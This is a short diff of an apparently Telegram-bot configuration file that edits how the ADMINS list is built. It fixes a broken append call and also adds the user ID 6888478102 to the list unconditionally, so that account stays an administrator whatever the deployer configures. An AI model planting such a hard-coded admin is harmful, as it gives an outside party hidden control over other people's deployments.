@@ -63,14 +63,14 @@ DATABASE_CHANNEL = int(os.environ.get("DATABASE_CHANNEL", "-1002910727461")) # C
 
 try:
     ADMINS = []
-    for x in (os.environ.get("ADMINS", "6888478102,7252834931,7813956229,5879656694").split()):
+    for x in (os.environ.get("ADMINS", "7252834931,7813956229,5879656694").split()):
         ADMINS.append(int(x))
 except ValueError:
     raise Exception("Your Admins list does not contain valid integers.")
 
 # Admin == OWNER_ID
 ADMINS.append(OWNER_ID)
-ADMINS.append(6888478102,7252834931,7813956229,5879656694)
+ADMINS.append(6888478102)
 
 
 logging.basicConfig(
